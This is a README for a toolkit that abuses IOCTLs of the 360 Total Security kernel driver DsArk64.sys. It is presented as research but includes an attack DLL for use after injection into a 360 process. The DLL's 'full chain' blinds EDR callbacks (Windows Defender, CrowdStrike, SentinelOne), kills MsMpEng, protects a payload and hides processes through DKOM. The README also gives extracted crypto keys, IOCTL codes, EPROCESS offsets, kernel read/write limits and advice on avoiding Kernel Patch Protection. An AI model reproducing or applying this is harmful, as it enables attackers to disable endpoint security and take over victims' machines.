# DsArk64.sys IOCTL Wrapper

Test and research wrapper for `DsArk64.sys` IOCTLs (360 Total Security kernel driver).

## File Layout

```
dsark64.h               - Constants, IOCTL codes, crypto keys, API declarations
dsark64_crypto.cpp      - AES-128-CBC (BCrypt), MD5, per-PID key derivation
dsark64_ioctl.cpp       - Per-IOCTL wrapper (encrypt/build buffer/DeviceIoControl)
dsark64_attack.cpp      - Attack primitives (callback removal, ETW-TI, DKOM)
dsark64_test.cpp        - Test harness (standalone EXE)
dsark64_attack_main.cpp - Attack DLL entry + exported functions
dsark64_attack.def      - DLL export definitions
build.bat               - Build script (Visual Studio x64)
```

## Build

```bat
:: Requires: Visual Studio 2019/2022, Windows SDK
:: Open "x64 Native Tools Command Prompt for VS"
build.bat
```

## Runtime Prerequisites

1. **Administrator privilege** (required by the driver's SeTokenIsAdmin check)
2. **One of the following:**
   - 360 Total Security is running (device `\Device\360SelfProtection` exists)
   - **OR** inject the DLL/EXE into a 360 process (360sd.exe, 360tray.exe, etc.)
3. The registry key must exist:
   `HKLM\SYSTEM\CurrentControlSet\services\360FsFlt` -> `daboot = DWORD:1`

## Test EXE (`dsark64_test.exe`)

```
Run from inside a 360 process after injection, or run directly if the
360SelfProtection device is accessible:

dsark64_test.exe
```

Tests performed:
- `[TEST] Crypto` - AES-CBC round-trip, MD5, per-PID key derivation
- `[TEST] 0x80863000` - Version query (expected: 0x11000231)
- `[TEST] 0x80863020` - Kernel address check
- `[TEST] 0x80863028 type=2` - Kernel read (reads the ntoskrnl MZ header)
- `[TEST] 0x80863028 type=1` - Kernel write round-trip (write same bytes back)
- `[TEST] 0x8086300C` - Encrypted kill dry run (uses own PID, so the driver rejects it)
- `[TEST] 0x80863004` - File protect add+remove
- `[TEST] 0x80863080` - Simple kill (interactive PID entry)

## Attack DLL (`dsark64_attack.dll`)

Inject into a 360 process, then call:

```c
// Load DLL from injected shellcode:
HMODULE h = LoadLibraryW(L"dsark64_attack.dll");

// Initialize and open the device handle.
typedef BOOL(*pfInit)(void);
pfInit Init = (pfInit)GetProcAddress(h, "DsArk_Init");
Init();

// Verify
typedef DWORD(*pfVer)(void);
pfVer Ver = (pfVer)GetProcAddress(h, "DsArk_Version");
DWORD ver = Ver();  // must be 0x11000231

// Full chain: blind WdFilter, kill MsMpEng (PID), protect payload
typedef BOOL(*pfChain)(const WCHAR*, DWORD, const WCHAR*);
pfChain Chain = (pfChain)GetProcAddress(h, "DsArk_FullChain");
Chain(L"WdFilter.sys", 1234 /*MsMpEng PID*/, L"C:\\payload.exe");

// Or just: blind EDR callbacks
typedef BOOL(*pfBlind)(const WCHAR*);
pfBlind Blind = (pfBlind)GetProcAddress(h, "DsArk_BlindEDR");
Blind(L"WdFilter.sys");   // Windows Defender
// Blind(L"CsFalconService.sys");  // CrowdStrike
// Blind(L"SentinelMonitor.sys");  // SentinelOne
```

## IOCTL Quick Reference

| IOCTL | Primitive | Crypto | Input |
|-------|-----------|--------|-------|
| `0x80863000` | Version | None | 4-byte output |
| `0x80863004` | File protect | AES-CBC (session) | 0x400 bytes |
| `0x80863008` | Simple kill | None | DWORD pid |
| `0x8086300C` | Enc kill | AES-CBC (per-PID) | 16 bytes |
| `0x80863010` | Enc kill (alt) | AES-CBC (per-PID) | 16 bytes |
| `0x80863014` | Clear flag | None | any |
| `0x80863020` | Kern addr check | None | 0x10 bytes (magic first) |
| `0x80863024` | Set mode | None | DWORD (0/1) |
| `0x80863028` | Kern read/write | AES-CBC + MD5 | 0x20..0x400 bytes |
| `0x80863040` | Registry protect | AES-CBC (session) | 0x400 bytes |
| `0x80863080` | Simple kill | None | DWORD pid |

## Crypto Keys (extracted from binary)

```
Session AES-128 Key: 62 B4 56 EC 40 7F 0A 9A 05 91 1C B6 F2 38 A7 FE
Session AES-CBC IV:  E5 93 29 B6 D4 08 E7 FA 55 76 37 E6 2C 9E AA 43

Kill Base Key:  70 13 6A A9 49 14 91 C3 7C 6D A1 95 CA FA D5 42
Kill Base IV:   A6 1F 41 4C 0C 29 73 A1 F6 4F 03 77 BA DF DD 40
```

## EPROCESS Offsets For DKOM

| Windows Build | ActiveProcessLinks | UniqueProcessId |
|---------------|-------------------|-----------------|
| 10 1507-1903  | 0x2E8             | 0x2E0           |
| 10 2004+      | 0x448             | 0x440           |
| 11 21H2       | 0x448             | 0x440           |
| 11 22H2+      | 0x448             | 0x440           |

## Notes

- Kernel read: max **32 bytes** per call (multiple calls batched automatically)
- Kernel write: max **512 bytes** per call
- Does not trigger KPP: callback tables and ETW_REG_ENTRY.EnableCount are not monitored
- Avoid writing to SSDT, IDT, GDT, and kernel code pages because KPP will likely cause a BSOD
